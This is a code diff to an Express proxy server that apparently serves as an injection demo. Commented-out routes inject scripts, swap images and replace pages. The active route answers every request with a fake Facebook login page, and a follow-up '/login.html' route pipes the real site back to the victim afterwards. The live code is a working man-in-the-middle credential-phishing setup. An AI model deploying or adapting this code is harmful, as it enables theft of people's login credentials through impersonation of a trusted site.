@@ -3,6 +3,7 @@ const app     = express();
 const path    = require('path');
 const fetch   = require('node-fetch');
 const cheerio = require('cheerio')
+const request = require('request');
 
 app.set('port', (process.env.PORT || 8080));
 
@@ -13,10 +14,10 @@ app.get('/ping', (req, res) => {
 
 
 /**** Code Injection ****/
-// app.get('/', async (request, response) => {
+// app.get('/', async (req, response) => {
 //   const SCRIPT_TO_ADD = 'alert("code added!");';
 
-//   const url = request.protocol + '://' + request.get('host') + request.originalUrl;
+//   const url = req.protocol + '://' + req.get('host') + req.originalUrl;
 //   console.log("Client request received", url)
 
 //   const fetchedResponse = await fetch(url);
@@ -33,11 +34,11 @@ app.get('/ping', (req, res) => {
 
 
 /**** Image Injection  ****/
-// app.get('/', async (request, response) => {
+// app.get('/', async (req, response) => {
 //   // const IMAGE_TO_REPLACE = 'https://media.lmneuquen.com/adjuntos/195/imagenes/003/563/0003563137.jpg';
 //   const IMAGE_TO_REPLACE = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTYUR6eER5dHC5V-uc9uat18eX-rXlmvAkvqQZ6IL7BjNChuXLg";
 
-//   const url = request.protocol + '://' + request.get('host') + request.originalUrl;
+//   const url = req.protocol + '://' + req.get('host') + req.originalUrl;
 //   console.log("Client request received", url)
 
 //   const fetchedResponse = await fetch(url);
@@ -53,8 +54,8 @@ app.get('/ping', (req, res) => {
 
 
 /**** HTML Login Injection ****/
-// app.get('/', async (request, response) => {
-//   const url = request.protocol + '://' + request.get('host') + request.originalUrl;
+// app.get('/', async (req, response) => {
+//   const url = req.protocol + '://' + req.get('host') + req.originalUrl;
 //   console.log("Client request received", url)
 
 //   console.log("Replacing whole html");
@@ -64,26 +65,24 @@ app.get('/ping', (req, res) => {
 
 
 /*** Facebook Login HTML Injection  ***/
-app.get('/', async (request, response) => {
-  const url = request.protocol + '://' + request.get('host') + request.originalUrl;
+app.get('/', async (req, res, next) => {
+  const url = req.protocol + '://' + req.get('host') + req.originalUrl;
   console.log("Client request received", url)
 
   console.log("Sending Facebook html");
-  response.sendFile(path.join(__dirname+'/facebook-login.html'));
+  res.sendFile(path.join(__dirname+'/facebook-login.html'));
+
 });
 
-app.get('/login.html', async (request, response) => {
-  const url = request.protocol + '://' + request.get('host') + request.originalUrl;
+app.get('/login.html', async (req, res) => {
+  const url = req.protocol + '://' + req.get('host') + req.originalUrl;
   console.log("Login", url)
 
-  const regex = new RegExp('/login.html.*', 'g');
+  const regex = new RegExp('login.html.*', 'g');
   const realUrl = url.replace(regex, '');
   console.log("Real Url", realUrl)
 
-  const fetchedResponse = await fetch(realUrl);
-  const html = await fetchedResponse.text();
-
-  response.send(html);
+  request({ url: realUrl }).pipe(res);
 });
 
 
